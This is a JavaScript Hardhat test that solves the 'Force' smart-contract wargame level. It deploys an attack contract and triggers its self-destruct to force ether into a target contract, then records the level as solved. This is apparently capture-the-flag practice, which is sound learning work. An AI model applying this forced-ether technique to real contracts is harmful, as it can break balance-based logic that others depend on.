const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const { isTypedArray } = require("util/types");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

describe("Force", () => {
  beforeEach(async () => {
    const accounts = await hre.ethers.getSigners();
    deployer = accounts[0];
    hacker = accounts[1];
    const factory = await ethers.getContractFactory("Force");
    contract = await factory.deploy();
    await contract.deployed();
  });

  it("initiates hack", async () => {
    const initialForceBalance = await ethers.provider.getBalance(
      contract.address
    );
    console.log("Initial balance of force : ", initialForceBalance);
    console.log("Deploying attack contract");
    const forceAttackFactory = await ethers.getContractFactory("AttackForce");
    forceAttack = await forceAttackFactory.deploy(contract.address);
    await forceAttack.deployed();
    console.log("Attack contract deployed");

    console.log("calling fallback to initiate selfDestruct");
    await hacker.sendTransaction({
      to: forceAttack.address,
      value: 1,
      gasLimit: 3e6,
    });
    expect(await ethers.provider.getBalance(contract.address)).to.gt(
      initialForceBalance
    );
    console.log("Hacked!!");
    util.updateTotalSolved(scriptName);
  });
});
